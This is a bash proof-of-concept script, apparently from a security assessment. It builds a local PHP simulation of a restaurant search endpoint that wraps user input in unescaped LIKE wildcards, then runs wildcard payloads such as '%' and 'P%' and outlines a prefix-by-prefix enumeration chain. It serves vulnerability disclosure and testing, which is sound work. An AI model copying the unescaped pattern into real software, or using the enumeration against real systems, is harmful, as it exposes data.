#!/bin/bash

# POC: LIKE Wildcard Injection Information Disclosure (v3)
# Direct PHP execution to demonstrate the vulnerability
# Simulates the vulnerable search_restaurants.php behavior

echo "=== LIKE Wildcard Injection POC (v3) ==="
echo "Demonstrating LIKE wildcard character injection vulnerability"
echo ""

# Create test PHP script
TEST_SCRIPT=$(mktemp --suffix=.php)
cat > "$TEST_SCRIPT" << 'PHPCODE'
<?php
// Simulate vulnerable search_restaurants.php endpoint

// Test restaurant database
$restaurants = [
    ['id' => 1, 'name' => 'Pizza Palace', 'category' => 'Italian'],
    ['id' => 2, 'name' => 'Pizza Hut', 'category' => 'Italian'],
    ['id' => 3, 'name' => 'Pizzeria Luigi', 'category' => 'Italian'],
    ['id' => 4, 'name' => 'Pasta Paradise', 'category' => 'Italian'],
    ['id' => 5, 'name' => 'Peter Pan Burger', 'category' => 'American'],
    ['id' => 6, 'name' => 'Taco Bell', 'category' => 'Mexican'],
];

// Get test case from command line argument
$testCase = $argc > 1 ? $argv[1] : 'test1';
$query = $argc > 2 ? $argv[2] : '';

// VULNERABLE CODE (from search_restaurants.php line 9)
// User input is directly wrapped with LIKE wildcards without escaping
$searchQuery = "%$query%";

// Simulate LIKE matching
$results = [];
foreach ($restaurants as $restaurant) {
    // Convert SQL LIKE pattern to regex
    $pattern = str_replace(['%', '_'], ['.*', '.'], preg_quote($searchQuery, '/'));
    $pattern = '/^' . $pattern . '$/i';
    
    if (preg_match($pattern, $restaurant['name']) || preg_match($pattern, $restaurant['category'])) {
        $results[] = $restaurant;
    }
}

// Output results
echo "QUERY: $query\n";
echo "PATTERN: $searchQuery\n";
echo "RESULTS: " . count($results) . "\n";
foreach ($results as $r) {
    echo "  - " . $r['name'] . " (" . $r['category'] . ")\n";
}
?>
PHPCODE

# Cleanup function
cleanup() {
    rm -f "$TEST_SCRIPT"
}
trap cleanup EXIT

# Test cases
echo "[*] Test 1: Literal search - 'pizza'"
php "$TEST_SCRIPT" test1 "pizza"
echo ""

echo "[*] Test 2: Wildcard attack - 'P%' (matches restaurants starting with P)"
php "$TEST_SCRIPT" test2 "P%"
RESULT=$(php "$TEST_SCRIPT" test2 "P%" | grep "RESULTS: " | cut -d: -f2 | xargs)
if [ "$RESULT" -gt 3 ]; then
    echo "    [!] VULNERABLE - Wildcard % matched $RESULT restaurants"
else
    echo "    [+] PROTECTED - Limited results"
fi
echo ""

echo "[*] Test 3: Single char wildcard - '_izza' (matches P_zza pattern)"
php "$TEST_SCRIPT" test3 "_izza"
RESULT=$(php "$TEST_SCRIPT" test3 "_izza" | grep "RESULTS: " | cut -d: -f2 | xargs)
if [ "$RESULT" -gt 0 ]; then
    echo "    [!] VULNERABLE - Wildcard _ matched $RESULT restaurants"
else
    echo "    [+] PROTECTED - No pattern matches"
fi
echo ""

echo "[*] Test 4: Complete enumeration - '%' (matches all restaurants)"
php "$TEST_SCRIPT" test4 "%"
RESULT=$(php "$TEST_SCRIPT" test4 "%" | grep "RESULTS: " | cut -d: -f2 | xargs)
if [ "$RESULT" -eq 6 ]; then
    echo "    [!] VULNERABLE - Wildcard % returned all $RESULT restaurants"
else
    echo "    [+] PROTECTED - Limited results ($RESULT)"
fi
echo ""

echo "[*] Test 5: Complex pattern - 'P_zza' (enumeration via single char wildcard)"
php "$TEST_SCRIPT" test5 "P_zza"
RESULT=$(php "$TEST_SCRIPT" test5 "P_zza" | grep "RESULTS: " | cut -d: -f2 | xargs)
if [ "$RESULT" -gt 0 ]; then
    echo "    [!] VULNERABLE - Pattern matching works: $RESULT matches"
else
    echo "    [+] PROTECTED - Pattern matching blocked"
fi
echo ""

echo "[*] Test 6: Category search - 'Italian%' (wildcard in category)"
php "$TEST_SCRIPT" test6 "Italian%"
RESULT=$(php "$TEST_SCRIPT" test6 "Italian%" | grep "RESULTS: " | cut -d: -f2 | xargs)
if [ "$RESULT" -gt 0 ]; then
    echo "    [!] VULNERABLE - Category wildcard matched: $RESULT results"
else
    echo "    [+] PROTECTED"
fi
echo ""

echo "[+] POC Complete"
echo ""
echo "=== VULNERABILITY SUMMARY ==="
echo "The vulnerable code: \$searchQuery = \"%\$query%\";"
echo ""
echo "Attack Vector: LIKE Wildcard Injection"
echo "  - % wildcard matches zero or more characters"
echo "  - _ wildcard matches exactly one character"
echo "  - Attackers can enumerate database by crafting patterns"
echo ""
echo "Example Attack Chain:"
echo "  1. Search 'P%' → learns all restaurants starting with P"
echo "  2. Search 'Pa%' → narrows down to restaurants starting with Pa"
echo "  3. Search 'Pas%' → further enumeration"
echo "  4. Continue until full restaurant names/categories extracted"
echo ""
echo "Impact: Information Disclosure - Attackers can enumerate and extract"
echo "        restaurant names, categories, and other searchable data"